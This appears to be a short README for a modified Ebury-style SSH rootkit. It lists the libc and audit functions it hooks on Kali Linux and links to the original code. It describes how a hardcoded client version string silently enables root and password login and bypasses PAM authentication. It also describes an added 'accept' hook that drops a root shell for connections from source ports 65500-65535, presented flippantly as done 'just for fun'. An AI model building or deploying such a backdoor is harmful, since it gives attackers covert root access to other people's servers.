The following hooks work on Kali:

	__syslog_chk	
	accept
	audit_log_acct_message
	audit_log_user_message
	fopen
	read

Hooking read to intercept the remote version string and if it matches the hardcoded one it sets the both PermitRootLogin and PasswordAuthentication to yes using the fopen hook and returns PAM_SUCCESS in pam_authenticate.
Also added the infamous 'accept' backdoor just for fun - drops a root shell if the source port is in the range of 65500-65535. No other checks or encryption for this one because YOLO!


Original code: https://github.com/rlbossman/ebury
